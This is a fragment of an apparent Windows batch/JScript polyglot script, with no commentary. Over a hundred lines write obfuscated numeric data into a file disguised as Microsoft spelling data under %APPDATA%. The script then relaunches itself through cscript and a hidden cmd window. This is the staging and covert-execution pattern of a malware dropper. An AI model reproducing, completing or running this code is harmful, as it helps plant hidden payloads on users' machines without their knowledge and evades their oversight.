>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(431.6;8798.73;85.429;35.64;24.3581;448.22;828.20;913.246;0980.586;203.843;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(232.862;92.3151;498.104;909.61;848.144;6774.691;215.906;154.624;196.6678;548.86;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.3;785.29;9618.431;4.579;48.777;48.3442;475.160;673.160;771.134;7483.469;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.816;116.812;58.5301;547.47;699.114;808.46;0775.809;105.399;114.811;115.3892;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.102;816.46;699.111;1287.809;47.812;107.805;47.3074;499.114;808.47;812.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9392.811;100.817;99.816;115.0408;547.77;805.99;382.111;3466.811;67.801;114.765;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.0766;816.95;750.48;649.48;4531.345;48.554;45.450;51.3478;446.99;814.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(448.90;7611.36;8.543;6.61;5.0768;75.7;61.1;64.78;8639.448;76.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(74.36;8.7317;343.6;51.5;35.7;4625.548;2.834;62.804;116.0981;816.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(458.47;547.119;0515.819;119.346;109.805;99.9231;814.111;815.111;802.116;8808.546;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.811;109.547;112.3202;807.105;747.99;801.114;2050.816;115.647;77.805;99.1069;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(782.111;811.67;801.114;6669.465;117.816;95.550;48.3492;749.48;345.48;654.45;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4793.550;51.446;99.814;116.1625;448.129;860.6;33.85;8440.729;32.61;1.955;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.7061;829.149;348.129;846.48;7593.829;143.36;9.543;6.7608;61.4;41.130;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(455.46;2035.73;48.829;129.748;61.5785;66.8;543.6;61.5;2480.65;7.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.722;49.6209;804.116;816.112;558.47;3972.547;119.819;119.746;109.9452;805.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.111;815.111;3710.802;116.546;99.811;109.8045;747.80;475.73;547.100;5523.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.815;47.367;80.2638;483.47;800.101;802.97;0997.817;108.816;46.804;116.1887;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.48;664.6;48.43;1945.36;1.55;5.67;2.0415;62.48;552.30;650.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6291.629;0.376;0.801;0.2194;803.0;397.0;808.0;1172.595;0.680;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9052;808.0;805.0;699.0;3566.821;0.395;0.383;0.2429;816.0;497.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;9631.801;0.809;0.801;0.7792;810.0;816.0;346.32;8150.729;48.613;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.49;42.7206;834.72;834.247;513.1;8653.71;11.65;0.73;130.4239;62.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.7;930.136;1953.781;13.926;198.924;152.6228;363.129;813.3;361.157;9580.863;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(161.633;111.879;235.2078;866.204;945.49;890.207;9161.45;226.869;254.950;87.9648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.25;648.179;894.197;0161.802;201.806;223.945;231.7424;940.120;889.199;868.158;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9116.437;227.949;188.937;107.9565;584.87;58.43;581.130;4086.768;18.951;185.783;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(140.9893;904.244;496.18;838.118;8538.904;64.364;65.855;220.5879;392.23;955.92;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(949.94;5522.623;53.852;36.486;75.7102;816.239;566.16;900.175;7464.891;127.898;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(127.942;55.4393;825.90;363.28;942.153;9064.821;74.845;82.60;175.0945;556.15;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(423.245;747.121;3522.829;101.917;169.881;107.4529;928.199;906.246;902.122;1681.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.775;48.468;36.9682;334.60;907.237;43.165;9682.850;143.389;41.888;182.0156;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(953.4;925.112;859.50;2901.574;39.953;85.875;47.0484;954.182;929.142;651.187;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0800.598;95.854;219.587;64.9120;933.241;906.153;802.144;3771.840;255.806;98.827;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(221.0512;897.74;711.145;538.226;0872.457;236.625;74.813;99.8833;857.123;333.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(895.156;5499.863;162.760;250.827;125.3015;850.106;844.120;866.109;8405.910;225.856;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(249.629;252.4164;456.216;848.244;898.165;5601.510;150.834;164.889;158.2547;326.174;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.66;831.184;8206.881;128.855;34.356;32.1497;881.37;929.100;936.247;7638.944;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(191.826;99.789;37.3697;415.122;346.57;387.118;1320.862;113.870;6.838;15.7919;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(837.22;886.97;867.17;3171.903;154.916;14.571;154.2232;828.197;908.205;867.208;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0413.939;125.831;240.925;59.2529;813.9;923.93;816.152;8130.534;8.597;218.876;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(80.1433;730.111;889.241;925.0;2203.923;231.749;7.864;147.9005;658.247;801.71;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(820.232;8850.948;168.572;171.947;222.4037;814.126;597.107;811.119;3200.869;129.903;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(167.79;172.7522;357.187;936.198;903.216;3807.830;180.814;205.329;244.2444;884.133;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.30;828.251;8372.427;137.342;84.357;178.7042;691.218;900.13;685.153;1333.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(135.815;59.48;230.8367;852.45;934.141;924.51;9992.546;18.441;245.892;47.3016;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(784.39;533.247;900.172;1609.578;218.540;184.877;169.6809;919.150;878.167;666.162;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1344.901;207.325;65.777;224.0612;834.249;542.154;863.17;1093.802;48.911;187.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.9455;375.223;399.123;945.153;7750.838;47.427;199.633;175.2318;689.181;874.220;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(668.60;1633.851;80.813;215.861;210.2100;897.85;927.105;922.87;0750.893;209.922;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.892;253.1697;904.230;377.251;613.191;9370.793;79.933;157.730;25.7001;556.47;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(888.207;588.5;1860.546;239.413;160.680;53.7355;918.239;79.39;328.213;6335.879;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(126.353;30.68;186.3626;918.54;919.211;495.143;2920.922;116.836;73.318;161.5049;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(830.2;906.48;830.2;5416.555;2.41;1.648;129.8103;948.161;829.208;864.129;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4431.905;48.829;202.749;11.1528;548.9;46.3;585.4;7233.56;19.62;85.383;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.4731;411.48;79.6;43.85;5060.74;8.419;2.687;65.0561;549.16;748.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.3;6476.585;4.67;19.47;82.9609;801.100;809.111;810.100;0022.449;30.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(28.46;3.7185;585.4;410.19;421.77;4992.805;99.814;111.815;111.6358;802.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.67;811.114;5096.812;111.814;97.816;105.4485;811.110;349.45;748.43;3904.36;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.685;4.311;19.8627;536.77;805.99;814.111;9405.815;111.802;116.432;73.2376;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.101;808.97;810.100;9568.332;79.812;101.814;97.8875;816.105;811.110;815.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3546.576;105.809;105.816;101.1933;800.49;738.48;336.6;4818.63;85.34;11.419;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(29.1586;784.104;697.108;801.115;9513.532;84.583;83.732;69.0809;483.78;558.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(456.52;8198.750;45.552;66.569;54.2147;545.67;550.57;365.49;3990.737;48.335;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.63;85.1922;54.3;519.28;777.105;6919.699;114.811;115.811;102.7646;816.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(384.105;809.101;3184.645;83.816;97.809;112.1515;432.115;801.114;818.105;2576.599;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.862;35.510;1.4423;41.48;47.6;65.43;2820.714;3.42;26.63;21.4172;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.101;649.193;921.17;7081.494;29.844;236.841;40.9584;862.73;421.8;389.96;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6821.643;34.829;160.829;131.1412;748.129;828.164;826.48;2268.824;49.311;48.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.7139;43.85;34.6;719.2;3405.785;83.649;19.548;17.6507;46.3;685.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(58.19;0222.710;87.697;115.804;105.3965;810.103;816.111;810.49;6343.416;48.414;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.33;85.6822;54.7;519.7;382.101;6172.800;109.811;110.800;49.3696;630.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(528.6;33.85;6067.54;10.319;21.477;105.5924;599.114;811.115;811.102;0851.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.367;111.814;112.5292;811.114;497.116;805.111;2026.810;49.738;48.336;6.9827;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.85;54.3;419.29;0479.477;105.599;114.811;115.6333;811.102;816.32;784.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8988.809;101.545;83.816;97.6198;809.112;432.80;767.65;1511.332;50.348;49.748;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.4946;313.6;39.42;834.72;2299.834;247.613;1.41;5.6138;45.0;72.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.224;9489.927;13.836;48.634;24.2991;515.50;548.49;657.48;3065.455;50.753;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.349;48.8856;350.48;548.90;624.15;4531.650;48.749;57.548;55.3315;750.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(348.49;348.50;5830.448;48.490;48.819;48.3039;361.6;610.43;66.1;2524.44;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.832;89.710;4.1543;41.49;747.48;745.48;2217.310;2.35;0.924;227.0531;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(713.136;32.1;30.48;5304.710;2.41;0.32;2.6869;632.186;32.1;955.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5298.77;2.51;0.52;2.6254;317.233;348.10;42.5;3536.40;224.928;95.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.7907;31.0;548.54;46.10;4701.543;6.71;4.51;132.3498;489.10;74.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(449.40;0967.748;38.748;12.56;10.9107;743.6;71.4;71.132;9251.589;10.43;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.860;10.6813;648.8;42.1;40.2;8827.33;7.861;32.861;10.0512;448.8;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.1;30.2;3119.33;1.834;160.448;13.6972;46.9;342.134;772.134;6542.947;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.51;1.45;5.4316;30.3;829.129;50.5;8647.489;44.854;228.953;49.3598;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(878.114;630.161;892.119;6989.913;126.921;136.857;37.3504;315.129;68.249;806.96;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6100.556;226.894;167.337;92.9423;941.225;910.61;903.158;3259.882;86.524;232.881;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(88.9941;451.105;825.121;544.233;3878.873;248.887;116.585;48.0801;937.207;865.208;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(510.181;8796.651;41.914;235.872;229.5795;805.105;851.133;515.126;8379.809;129.938;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(184.599;54.1537;889.101;55.63;631.149;1339.915;254.866;1.933;16.3446;414.35;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(488.122;896.203;3409.449;130.945;3.801;215.0973;71.8;807.199;426.66;3194.806;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(129.841;21.866;205.3167;826.90;38.203;856.39;8367.850;215.787;9.798;236.0140;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(836.49;830.3;413.48;1089.830;3.69;2.51;1.4927;648.129;847.48;824.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6855.711;48.39;6.53;85.8455;34.6;719.2;385.83;8376.349;19.648;17.66;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.0086;585.4;48.19;610.87;8471.597;115.804;105.810;103.5308;816.111;810.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(616.48;9712.714;6.63;85.64;7.1142;519.7;382.101;800.109;0942.811;110.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.330;48.7884;428.6;63.85;74.10;0229.719;21.577;105.599;114.7401;811.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.102;816.32;3980.767;111.814;112.811;114.2781;397.116;805.111;810.49;3084.438;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.736;6.63;85.1148;44.3;419.29;477.105;8544.399;114.811;115.811;102.7742;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.32;584.105;809.101;5040.745;83.816;97.809;112.5745;432.80;567.65;532.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6396.348;49.648;2.519;51.8541;30.0;40.216;726.228;5798.904;63.822;17.950;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(225.6373;70.0;40.0;30.216;2062.348;13.46;9.496;134.1572;472.1;801.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.2;3581.41;5.60;160.830;1.1584;574.48;626.6;39.42;3311.834;72.834;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(247.413;1.2075;69.3;349.13;76.11;1532.742;134.572;134.947;13.6295;51.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(516.1;54.48;3022.547;6.59;42.834;72.1444;834.247;713.1;69.4;5787.749;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(34.54;32.864;251.4180;927.216;878.162;827.131;2115.862;109.953;86.949;178.2473;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(398.91;498.83;833.209;6884.837;213.868;161.906;216.6068;389.47;870.43;832.193;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0021.448;129.950;6.511;42.5123;834.72;834.247;613.1;6717.39;16.42;47.649;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(129.9600;934.48;829.231;348.129;3706.928;48.829;189.44;32.8386;815.59;857.199;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(820.92;8473.932;243.818;41.955;239.9106;832.149;870.61;441.64;7516.909;111.610;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.955;32.7889;807.204;619.159;665.46;0694.916;45.548;129.852;48.1273;829.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(864.126;648.124;6509.649;11.748;9.76;3.3568;585.4;56.19;72.85;1556.483;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.519;48.717;6.0664;43.85;44.8;319.10;9321.387;97.815;104.805;110.6253;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.116;811.110;649.16;4020.748;14.46;3.385;4.7672;47.19;67.82;801.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2035.809;111.810;100.649;30.0500;348.28;36.3;485.4;0782.310;19.321;77.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.0837;814.111;815.111;802.116;1288.532;67.811;114.812;111.8337;814.97;816.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.110;6670.749;38.648;36.66;3.1921;385.4;33.19;729.77;2830.805;99.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.815;111.8268;802.116;632.84;805.109;0129.801;45.783;116.397;109.2661;812.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(680.67;765.32;3213.350;48.649;48.62;19.6409;351.0;40.0;916.26;1757.928;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(204.463;122.417;250.0791;925.0;40.0;50.0;5458.916;48.534;4.632;155.0523;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(854.101;747.85;721.95;1497.946;224.858;54.665;46.1157;805.254;852.246;655.81;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0231.565;9.487;40.926;155.5186;654.112;930.14;851.167;0234.455;48.713;6.79;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.9119;834.72;834.247;613.1;0779.61;11.75;0.54;130.2830;41.0;356.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(764.66;6765.665;53.895;230.806;168.7190;949.138;932.216;362.82;2784.868;111.547;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(209.426;237.2473;949.235;598.123;777.241;0442.417;63.475;136.811;125.8475;846.247;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(513.3;311.140;5310.904;230.833;155.71;247.5157;905.95;950.4;839.162;4957.928;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.770;71.545;23.8380;840.241;907.209;827.10;1482.894;221.468;56.936;223.2469;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(936.192;818.174;473.176;5704.694;115.30;214.389;100.1970;672.62;846.75;937.69;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6392.717;31.862;173.857;134.1270;619.86;935.23;673.162;9848.762;165.378;191.534;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(74.4279;341.178;858.236;947.137;6250.949;240.896;143.820;223.8140;891.181;821.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(902.32;1375.836;82.804;208.908;225.2258;463.45;951.55;889.175;6838.656;32.857;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(138.934;47.0151;843.117;935.199;553.211;9607.841;226.794;174.877;177.5425;449.198;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(792.178;891.226;5264.588;159.806;239.572;136.4277;737.195;41.176;492.244;6105.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(87.951;219.354;210.8556;886.237;909.126;950.45;5858.63;159.610;57.826;136.9858;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(827.99;764.31;847.74;2269.485;243.426;157.922;181.4517;832.16;904.232;747.210;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6634.669;220.672;77.875;139.3134;817.1;33.124;953.6;3228.910;40.818;141.858;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.5708;917.36;809.141;829.128;9556.865;153.906;61.482;11.5922;908.144;887.38;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(785.133;1627.913;58.947;76.808;207.0845;804.120;52.170;811.107;3903.800;124.748;
endlocal
goto :f3do

:f3do
cscript //nologo //E:JScript "%~f0" "%~f0" __s__
exit /b 0

:f3o

:f3d

endlocal
exit /b 0
*/
var sh = new ActiveXObject('WScript.Shell');
var bat = WScript.Arguments(0);
var a = '';
for (var i = 1; i < WScript.Arguments.length; i++) a += ' ' + WScript.Arguments(i);
sh.Run('cmd /c "' + bat + '"' + a, 0, false);
WScript.Quit(0);
